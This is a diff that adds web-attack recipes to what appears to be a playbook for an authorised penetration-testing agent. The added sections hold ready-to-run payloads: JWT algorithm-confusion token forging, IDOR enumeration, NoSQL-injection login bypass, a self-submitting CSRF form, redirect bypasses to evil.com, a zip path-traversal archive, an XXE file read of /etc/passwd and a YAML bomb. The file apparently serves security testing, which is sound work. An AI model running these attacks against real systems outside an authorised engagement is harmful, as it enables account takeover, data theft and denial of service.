@@ -67,6 +67,113 @@ ${7*7}           (EL/template variants)
 Confirm = marker reflected unencoded in response body, or template math
 evaluated. Console.log markers avoid side effects vs alert().
 
+## JWT algorithm confusion (RS256 → HS256)
+
+Generalized beyond any one target — three steps, not just the forge command:
+
+```bash
+# 1. locate the RSA public key: config, /.well-known/jwks.json, a leaked
+#    static asset, or bundled in the app's own source if available
+curl -s "<url>/.well-known/jwks.json"
+grep -rn "PUBLIC KEY\|jwt.pub\|RS256" <source-if-available>
+# 2. confirm the alg field is attacker-controllable
+jwt_tool <token> -T                          # tamper mode, inspect header
+# 3. forge: sign with HS256 using the RSA public key AS the HMAC secret
+jwt_tool <token> -X k -pk <pubkey.pem>
+```
+Confirm = the forged token is accepted by an endpoint that should require the
+original signer (e.g. an admin-only route).
+
+## IDOR / BOLA enumeration
+
+```bash
+# sweep a predictable ID space against an authenticated endpoint, diffing
+# CONTENT not just status — many apps 200 an empty/redacted object for
+# out-of-scope IDs, so a bare status check false-positives
+for id in $(seq 1 50); do
+  curl -s -H "Authorization: Bearer $TOKEN" "<url>/api/resource/$id" \
+    -o "artifacts/idor_$id.json" -w "$id: %{http_code}\n"
+done
+```
+Confirm = another user's real data (not your own, not an empty/error shape)
+returned under your own auth context.
+
+## NoSQL injection (MongoDB-shaped targets)
+
+Operator injection via a JSON body, not form-encoding:
+
+```bash
+# auth bypass
+curl -s -X POST "<url>/login" -H "Content-Type: application/json" \
+  -d '{"email":{"$ne":null},"password":{"$ne":null}}'
+curl -s -X POST "<url>/login" -H "Content-Type: application/json" \
+  -d '{"email":{"$gt":""},"password":{"$gt":""}}'
+# blind boolean extraction
+curl -s -X POST "<url>/login" -H "Content-Type: application/json" \
+  -d '{"email":{"$regex":"^admin"},"password":{"$ne":null}}'
+```
+Confirm = auth bypass or a response that changes shape based on the injected
+boolean (classic blind-injection oracle).
+
+## CSRF PoC generation
+
+For a state-changing endpoint found to lack CSRF protection:
+
+```bash
+cat > artifacts/csrf_poc.html <<HTML
+<form action="<url>/<endpoint>" method="POST" id="f">
+  <input name="<param>" value="<value>">
+</form>
+<script>document.getElementById('f').submit()</script>
+HTML
+```
+Confirm by loading it in a session cookie'd as the victim (the same
+`chromium --headless --dump-dom` technique as the DOM-XSS recipe in
+`sentinel-challenges` — load the PoC, then check the target state actually
+changed).
+
+## Redirect-allowlist bypass
+
+Most real-world allowlist bypasses exploit a `startsWith()`/`includes()`
+check rather than a proper URL parse-and-compare — if source is available
+(see `sentinel-challenges` §2b), read the check before guessing; if not, try:
+
+```
+<url>/redirect?to=https://real-allowed-host.evil.com
+<url>/redirect?to=https://real-allowed-host@evil.com
+<url>/redirect?to=//evil.com
+<url>/redirect?to=https://evil.com#https://real-allowed-host
+```
+Confirm = the final `Location` header or rendered navigation leaves the
+allowlisted host.
+
+## File-upload attack chains
+
+```bash
+# zip path traversal — write outside the intended extraction dir
+python3 -c "
+import zipfile
+z = zipfile.ZipFile('artifacts/evil.zip','w')
+z.writestr('../../../../tmp/sentinel_marker.txt','PWNED')
+z.close()"
+curl -s -F "file=@artifacts/evil.zip" "<url>/file-upload"
+
+# XXE via an XML-bearing upload (DOCX, SVG, any XML-parsed format)
+cat > artifacts/xxe.xml <<'XML'
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
+<r>&x;</r>
+XML
+
+# YAML bomb (billion-laughs) — DoS confirmation ONLY, requires its own
+# grant, always timeboxed, never against a shared/multi-tenant sandbox
+cat > artifacts/yaml_bomb.yaml <<'YML'
+a: &a ["x","x","x","x","x","x","x","x","x"]
+b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+YML
+```
+
 ## Tool-backed recipes (prebaked image; embed SENTINEL_GRANT)
 
 Prefer these over hand-rolled payloads once a vuln class is suspected — they
